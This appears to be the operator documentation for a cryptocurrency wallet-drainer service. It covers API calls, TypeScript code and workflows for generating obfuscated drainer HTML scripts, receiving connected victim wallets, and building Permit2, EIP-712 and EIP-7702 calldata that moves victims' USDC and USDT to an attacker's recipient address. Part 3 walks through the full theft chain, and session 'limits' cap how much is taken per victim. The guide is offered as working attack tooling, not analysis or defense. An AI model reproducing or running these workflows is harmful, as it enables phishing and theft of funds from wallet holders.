# Contract & Session Interaction Guide

Complete examples for executing strategies and managing sessions.

---

## Part 1: Strategy Execution (No Session)

### 1.1 Call `/api/action/execute` Endpoint

**Create calldata for a strategy:**

```bash
TOKEN="eyJhZGRyZXNzIjoiMHg0ZUNkZmU4YjNhRTk3YjNmNGYyNjZhNzQyOUZhNWNGMmVDMzFGNjkzIn0.G2p_4gEYGhRbaQqSQHygzKMsQMdq41Py_Y5YOaspBx8"

# Example: Permit2 Strategy
curl -X POST http://localhost:3001/api/action/execute \
  -H "Cookie: s26_session=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "mode": "permit2",
    "backend": "stealth-exchange",
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "recipient": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "chainId": 1,
    "tokens": [
      "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    ],
    "amounts": ["1000000000"]
  }'
```

**Response:**

```json
{
  "status": "success",
  "mode": "permit2",
  "binding": {
    "contractAddress": "0x4593D97d6E932648fb4425aC2945adaF66927773",
    "contractName": "Permit2Executor",
    "functionName": "pullBatchFromAllowance",
    "abi": [...],
    "args": [...]
  },
  "calldata": "0x...",
  "target": "0x4593D97d6E932648fb4425aC2945adaF66927773",
  "value": "0"
}
```

### 1.2 All Available Strategies

```bash
# Get all strategy presets
curl -X GET http://localhost:3001/api/action/execute \
  -H "Cookie: s26_session=$TOKEN" \
  -H "Content-Type: application/json"

# Lists all 9 modes with descriptions
```

**Available Modes:**

| Mode | Backend | Use Case | Requires |
|------|---------|----------|----------|
| **direct** | StealthExchange | Direct ERC20 transfer | Pre-approval |
| **approve** | ERC20 | Set approval + transfer | Separate txs |
| **permit** | ERC2612Executor | ERC-2612 native permit | EIP-712 |
| **permit2** | Permit2Executor | Uniswap Permit2 | EIP-712 |
| **multicall** | BatchMulticall | Multiple calls atomic | None |
| **eip712** | StealthExchange | Batch permit transfer | EIP-712 |
| **eip7702** | EIP7702BatchDelegate | Account delegation | EIP-7702 |
| **gasless** | EIP7702 or Permit2 | Gasless execution | Delegation or EIP-712 |
| **trails** | StealthExchange | Optimal routing | None |

### 1.3 JavaScript/TypeScript Example

```typescript
// Frontend SDK Usage

interface StrategyRequest {
  mode: 'permit2' | 'eip712' | 'eip7702' | 'direct' | 'approve' | 'permit' | 'multicall' | 'gasless' | 'trails';
  backend: string;
  wallet: string;
  recipient: string;
  chainId: number;
  tokens?: string[];
  amounts?: string[];
}

async function executeStrategy(request: StrategyRequest) {
  const response = await fetch('/api/action/execute', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(request),
  });

  if (!response.ok) {
    throw new Error('Strategy execution failed');
  }

  const { calldata, target, value } = await response.json();
  
  // Execute on blockchain
  const tx = await signer.sendTransaction({
    to: target,
    data: calldata,
    value: value || '0',
  });

  return tx.hash;
}

// Usage:
const txHash = await executeStrategy({
  mode: 'permit2',
  backend: 'stealth-exchange',
  wallet: userAddress,
  recipient: receiverAddress,
  chainId: 1,
  tokens: ['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'],
  amounts: ['1000000000'],
});
```

---

## Part 2: SessionManager Contract Interaction

### 2.1 Session Manager ABI Functions

**Key Functions:**

```solidity
// Get current usage for a session
function getLimitUsage(address sessionKey) external view returns (uint256)

// Increment usage (called after execution)
function incrementUsageLimit(address sessionKey, uint256 amount) external

// Create session with limits (custom function - may need to implement)
function createSession(
  address owner,
  address[] calldata allowedTokens,
  uint256 maxAmount,
  uint256 duration,
  address allowedSpender
) external returns (bytes32 sessionKey)
```

### 2.2 Direct Contract Calls (ethers.js)

```typescript
import { ethers } from 'ethers';

const SESSION_MANAGER_ADDRESS = '0x4AE428352317752a51Ac022C9D2551BcDef785cb';

// SessionManager ABI (minimal example)
const SESSION_MANAGER_ABI = [
  'function getLimitUsage(address sessionKey) public view returns (uint256)',
  'function incrementUsageLimit(address sessionKey, uint256 amount) public',
];

const signer = provider.getSigner();
const sessionManager = new ethers.Contract(
  SESSION_MANAGER_ADDRESS,
  SESSION_MANAGER_ABI,
  signer
);

// Check usage
const usage = await sessionManager.getLimitUsage(sessionKeyAddress);
console.log('Session usage:', usage.toString());

// Increment after execution
const tx = await sessionManager.incrementUsageLimit(sessionKeyAddress, amountUsed);
await tx.wait();
```

### 2.3 Create Session (Backend)

```typescript
// Backend: Create session before strategy execution

interface SessionConfig {
  wallet: string;
  allowedTokens: string[];
  maxAmount: string;
  duration: number; // seconds
  recipient: string;
}

async function createSession(config: SessionConfig): Promise<string> {
  // Option 1: Call contract directly
  const sessionManager = new ethers.Contract(
    SESSION_MANAGER_ADDRESS,
    SESSION_MANAGER_ABI,
    relayerSigner
  );

  // Generate unique session key
  const sessionKey = ethers.keccak256(
    ethers.solidityPacked(
      ['address', 'address', 'uint256'],
      [config.wallet, config.recipient, Date.now()]
    )
  );

  // Store session config (Redis/DB)
  await redis.set(`session:${sessionKey}`, JSON.stringify({
    wallet: config.wallet,
    allowedTokens: config.allowedTokens,
    maxAmount: config.maxAmount,
    maxAmountUsed: '0',
    createdAt: Date.now(),
    expiresAt: Date.now() + config.duration * 1000,
    recipient: config.recipient,
  }), 'EX', config.duration);

  return sessionKey;
}
```

---

## Part 3: Complete Workflow Examples

### 3.1 Drainer → Strategy Execution (Direct)

```bash
# Step 1: Generate drainer script
curl -X POST http://localhost:3001/api/script/generate-drainer \
  -H "Cookie: s26_session=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"obfuscation": "medium", "format": "html"}'

# Step 2: User opens HTML, clicks to connect wallet
# Script sends POST to /api/submit-drainer
# Payload: {wallet, receiver, site, timestamp}

# Step 3: Backend receives connection at /api/submit-drainer
# Decides to execute permit2 strategy

# Step 4: Call strategy endpoint
curl -X POST http://localhost:3001/api/action/execute \
  -H "Content-Type: application/json" \
  -d '{
    "mode": "permit2",
    "backend": "stealth-exchange",
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "recipient": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "chainId": 1
  }'

# Step 5: Return calldata to frontend
# Frontend executes on blockchain
```

### 3.2 Drainer → Session-Limited Execution

```typescript
// Backend workflow with sessions

async function handleDrainerConnection(wallet: string, receiver: string) {
  // 1. Create session with limits
  const sessionKey = await createSession({
    wallet,
    allowedTokens: [
      '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
      '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
    ],
    maxAmount: '10000000000', // 10,000 USDC
    duration: 86400, // 24 hours
    recipient: receiver,
  });

  // 2. Execute strategy with session awareness
  const strategyResponse = await fetch('/api/action/execute', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      mode: 'permit2',
      backend: 'stealth-exchange',
      wallet,
      recipient: receiver,
      chainId: 1,
      sessionKey, // Add session constraint
    }),
  });

  const { calldata, target } = await strategyResponse.json();

  // 3. Return to frontend for execution
  return {
    status: 'ready',
    calldata,
    target,
    sessionKey, // Frontend tracks session
  };
}

// Frontend execution
async function executeWithSession(plan: ExecutionPlan) {
  // Send transaction
  const tx = await signer.sendTransaction({
    to: plan.target,
    data: plan.calldata,
  });

  await tx.wait();

  // Track session usage
  const sessionManager = new ethers.Contract(...);
  const amountUsed = '1000000000'; // 1000 USDC
  
  await sessionManager.incrementUsageLimit(plan.sessionKey, amountUsed);
  
  console.log('Transaction executed, session updated');
}
```

### 3.3 Multiple Strategies in One Session

```typescript
// One session can execute multiple strategies

async function multiStrategyExecution(wallet: string, receiver: string) {
  // Create one session with $10k limit
  const sessionKey = await createSession({
    wallet,
    allowedTokens: ['USDC', 'USDT', 'DAI'],
    maxAmount: '10000000000',
    duration: 86400,
    recipient: receiver,
  });

  // Strategy 1: Permit2 transfer (5000 USDC)
  const tx1 = await executeStrategy({
    mode: 'permit2',
    wallet,
    recipient: receiver,
    tokens: ['USDC'],
    amounts: ['5000000000'],
    sessionKey,
  });

  // Session now shows: used 5000 / 10000

  // Strategy 2: EIP-712 transfer (3000 USDT)
  const tx2 = await executeStrategy({
    mode: 'eip712',
    wallet,
    recipient: receiver,
    tokens: ['USDT'],
    amounts: ['3000000000'],
    sessionKey,
  });

  // Session now shows: used 8000 / 10000
  // Only 2000 left before limit

  // Strategy 3: Would fail - exceeds limit
  // const tx3 = await executeStrategy({...}); // Would revert
}
```

---

## Part 4: Checking Contract Status

### 4.1 Get Strategy Details

```bash
# What contracts are available?
curl -X GET http://localhost:3001/api/contracts \
  -H "Cookie: s26_session=$TOKEN"

# Response shows all contracts with ABIs:
{
  "status": "ok",
  "contracts": [
    {
      "id": "session-manager",
      "address": "0x4AE428352317752a51Ac022C9D2551BcDef785cb",
      "abi": [...],
      "functions": ["getLimitUsage", "incrementUsageLimit"]
    },
    {
      "id": "permit2-executor",
      "address": "0x4593D97d6E932648fb4425aC2945adaF66927773",
      "abi": [...],
      "functions": ["pullBatchFromAllowance", ...]
    },
    ...
  ]
}
```

### 4.2 Verify Strategy Works

```bash
# Compile and test a specific strategy
curl -X POST http://localhost:3001/api/compile-test \
  -H "Cookie: s26_session=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "mode": "permit2",
    "tokens": ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"],
    "amounts": ["1000000000"]
  }'

# Response shows if strategy can execute
{
  "status": "ok",
  "strategy": "permit2",
  "isValid": true,
  "calldata": "0x...",
  "target": "0x4593D97d6E932648fb4425aC2945adaF66927773"
}
```

### 4.3 Check Session Status

```typescript
// Query session usage
async function getSessionStatus(sessionKey: string) {
  // From Redis/DB
  const session = await redis.get(`session:${sessionKey}`);
  
  if (!session) {
    return { status: 'expired', message: 'Session not found' };
  }

  const config = JSON.parse(session);
  const timeLeft = config.expiresAt - Date.now();
  const amountLeft = BigInt(config.maxAmount) - BigInt(config.maxAmountUsed);

  return {
    status: 'active',
    createdAt: new Date(config.createdAt),
    expiresAt: new Date(config.expiresAt),
    timeLeftSeconds: Math.floor(timeLeft / 1000),
    maxAmount: config.maxAmount,
    amountUsed: config.maxAmountUsed,
    amountRemaining: amountLeft.toString(),
    allowedTokens: config.allowedTokens,
  };
}

// Usage
const status = await getSessionStatus('0x...');
console.log(`Session active for ${status.timeLeftSeconds}s`);
console.log(`${status.amountRemaining} left to spend`);
```

---

## Part 5: Error Handling

### 5.1 Strategy Execution Errors

```typescript
async function executeWithErrorHandling(request: StrategyRequest) {
  try {
    const response = await fetch('/api/action/execute', {
      method: 'POST',
      body: JSON.stringify(request),
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(`Strategy error: ${error.message}`);
    }

    return await response.json();
  } catch (error) {
    if (error.message.includes('Session limit exceeded')) {
      console.error('Cannot execute: session limit reached');
      // Suggest creating new session or waiting
    } else if (error.message.includes('Strategy not supported')) {
      console.error('Mode not available:', request.mode);
      // Try alternative strategy
    } else {
      console.error('Unknown error:', error);
    }
  }
}
```

### 5.2 Session Errors

```bash
# Session expired
{
  "error": "Session expired",
  "sessionKey": "0x...",
  "expiresAt": "2025-08-23T12:00:00Z"
}

# Session limit exceeded
{
  "error": "Session limit exceeded",
  "sessionKey": "0x...",
  "limit": "10000000000",
  "used": "10000000000"
}

# Token not allowed
{
  "error": "Token not in allowed list",
  "token": "0x...",
  "allowedTokens": ["0x..."]
}
```

---

## Quick Reference: API Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/script/generate-drainer` | POST | Generate wallet-connection script |
| `/api/submit-drainer` | POST | Backend receives wallet connection |
| `/api/action/execute` | POST | Generate strategy calldata |
| `/api/contracts` | GET | List all available contracts |
| `/api/compile-test` | POST | Test strategy compilation |
| `/api/settings` | GET/POST | View/update session settings |

---

## Summary

**To interact with contracts/sessions:**

1. **Call `/api/action/execute`** to generate calldata for any strategy
2. **Create session** with limits before execution (optional)
3. **Execute calldata** on blockchain via wallet
4. **Track session usage** with SessionManager
5. **Enforce limits** in backend logic

All 9 strategies work with or without sessions. Sessions are optional safety wrappers!
